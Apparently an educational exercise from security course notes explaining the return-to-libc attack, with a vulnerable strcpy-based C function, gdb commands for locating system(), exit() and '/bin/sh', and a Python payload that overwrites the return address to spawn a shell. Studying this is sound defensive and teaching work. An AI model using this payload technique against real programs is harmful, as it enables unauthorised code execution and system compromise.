
> [!exercise]+ Understanding the Return-to-libc Attack
>
> The return-to-libc attack allows an attacker to execute arbitrary code by exploiting a buffer overflow vulnerability and leveraging existing functions in the C standard library (libc), even when the stack is non-executable.
>
> Consider the vulnerable program `retlibc.c`:
>
> ```c
> int bof(char *str)
> {
>     char buf[12];
>     strcpy(buf, str);
>     printf("You entered: %s\n", buf);
>     return 0;
> }
> ```
>
> The `bof()` function suffers from a buffer overflow vulnerability due to the unsafe usage of `strcpy()`. An attacker can provide an input longer than the buffer size to overwrite the function's return address on the stack.
>
> To perform the return-to-libc attack, the attacker needs to:
>
> 1. Find the addresses of the desired libc functions (`system()` and `exit()`):
>    ```
>    (gdb) print system
>    $1 = {<text variable, no debug info>} 0xf7e175e0 <system\>
>    (gdb) print exit
>    $2 = {<text variable, no debug info>} 0xf7e0a360 <exit\>
>    ```
>
> 2. Locate the address of a string (e.g., `/bin/sh`) to be passed as an argument to `system()`. One way is to search for it in the libc memory space:
>    ```
>    (gdb) find 0xf7dd3000,+99999999,"/bin/sh"
>    0xf7f5b406
>    ```
>
> 3. Craft a payload that includes:
>    - Buffer overflow padding (24 bytes of "A" to reach the return address)
>    - Address of `system()` (overwrite the return address)
>    - Address of `exit()` (return address for `system()`)
>    - Address of the `/bin/sh` string (argument for `system()`)
>
>    Example payload:
>    ```python
>    payload = "A" * 24                     # Buffer overflow padding
>    payload += "\xe0\x75\xe1\xf7"          # Address of system()
>    payload += "\x60\xa3\xe0\xf7"          # Address of exit()
>    payload += "\x06\xb4\xf5\xf7"          # Address of "/bin/sh"
>    ```
>
> When the vulnerable function returns, it jumps to `system()` with `/bin/sh` as the argument, spawning a shell.
>
> The return-to-libc attack demonstrates the importance of proper input validation and secure coding practices to prevent buffer overflow vulnerabilities. It also highlights the need for mitigations like non-executable stack and Address Space Layout Randomization (ASLR) to make exploitation more challenging.
